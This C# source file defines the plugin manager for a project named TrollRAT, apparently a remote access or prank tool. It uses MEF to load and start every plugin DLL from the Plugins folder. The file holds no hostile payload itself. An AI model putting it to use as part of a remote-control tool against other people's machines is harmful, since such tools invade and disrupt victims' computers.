using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.IO;
using System.Reflection;

namespace TrollRAT.Plugins
{
    internal class PluginManager
    {
        [ImportMany(typeof(ITrollRATPlugin))]
        internal ITrollRATPlugin[] plugins = null;

        internal void loadPlugins()
        {
            var pluginFolder = Path.Combine(Path.GetDirectoryName(Assembly.GetCallingAssembly().Location), "Plugins");
            var catalog = new AggregateCatalog();

            if (Directory.Exists(pluginFolder))
            {
                foreach (string dir in Directory.GetDirectories(pluginFolder))
                {
                    catalog.Catalogs.Add(new DirectoryCatalog(dir));
                }
            }

            var container = new CompositionContainer(catalog);
            container.ComposeParts(this);

            foreach (ITrollRATPlugin plugin in plugins)
                plugin.onLoad();
        }
    }
}
